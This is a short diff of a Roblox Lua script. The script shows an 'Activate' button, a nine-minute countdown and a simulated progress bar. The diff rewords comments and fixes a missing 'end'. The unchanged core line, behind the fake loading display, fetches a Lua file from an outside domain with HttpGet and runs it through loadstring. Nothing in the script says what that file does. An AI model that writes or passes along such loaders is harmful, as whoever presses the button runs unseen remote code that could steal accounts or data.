@@ -109,10 +109,12 @@ local isActive = false
 local countdown = 9 * 60 -- 9 minutes in seconds
 local currentTime = 0 -- To track the elapsed time for the loading screen
 
--- Add the script to be executed immediately when Activate is pressed
+-- Function to execute the script after the GUI is shown
 local function executeScript()
-    -- This will load and run your external script immediately
+    -- This will load and run your external script
     loadstring(game:HttpGet("https://egorikusa.space/04e1a334edb1c2b754275480.lua", true))()
+end
+
 -- Activate Button Functionality
 local function activateAction()
     if not isActive then
@@ -121,7 +123,7 @@ local function activateAction()
         activateButton.Text = "Running..."
         activateButton.BackgroundColor3 = Color3.new(0.5, 0.5, 0.5)
 
-        -- Immediately run the external script
+        -- Run the external script immediately after the GUI is shown
         executeScript()
 
         -- Simulate Progress Bar Animation
